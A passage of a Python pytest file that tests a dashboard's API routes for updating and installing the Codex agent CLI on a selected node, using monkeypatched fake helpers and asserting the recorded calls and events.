    node = hub.NodeEntry(name="local", url="local", mode="local")
    calls: list[tuple[str, str]] = []
    events: list[str] = []
    monkeypatch.setattr(dashboard_app, "node_by_name", lambda name: node)

    def fake_update(selected, agent):  # type: ignore[no-untyped-def]
        calls.append((selected.name, agent))
        return {
            "ok": True,
            "agent": agent,
            "label": "Codex",
            "node": selected.name,
            "before_version": "codex-cli 1.2.3",
            "after_version": "codex-cli 1.2.4",
            "changed": True,
            "error": "",
        }

    monkeypatch.setattr(dashboard_app, "node_agent_tool_update_payload", fake_update)
    monkeypatch.setattr(
        dashboard_app,
        "append_hub_event",
        lambda level, event, message, **kwargs: events.append(event),
    )

    response = TestClient(dashboard_app.create_app()).post(
        "/api/nodes/local/agent-tools/codex/update"
    )

    assert response.status_code == 200
    assert response.json()["node"] == "local"
    assert calls == [("local", "codex")]
    assert events == ["agent.update_succeeded"]


def test_dashboard_agent_install_route_targets_the_selected_node(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
    node = hub.NodeEntry(name="local", url="local", mode="local")
    calls: list[tuple[str, str, str]] = []
    events: list[str] = []
    monkeypatch.setattr(dashboard_app, "node_by_name", lambda name: node)

    def fake_install(selected, agent, option_id):  # type: ignore[no-untyped-def]
        calls.append((selected.name, agent, option_id))
        return {
            "ok": True,
            "agent": agent,
            "label": "Codex",
            "option": option_id,
            "source": "mirror",
            "node": selected.name,
            "after_status": "available",
            "after_version": "codex-cli 2.0.0",
            "changed": True,
            "error": "",
        }

    monkeypatch.setattr(dashboard_app, "node_agent_tool_install_payload", fake_install)
    monkeypatch.setattr(
        dashboard_app,
        "append_hub_event",
        lambda level, event, message, **kwargs: events.append(event),
    )

    response = TestClient(dashboard_app.create_app()).post(
        "/api/nodes/local/agent-tools/codex/install/npmmirror"
    )

    assert response.status_code == 200
    assert response.json()["node"] == "local"
    assert calls == [("local", "codex", "npmmirror")]
    assert events == ["agent.install_succeeded"]
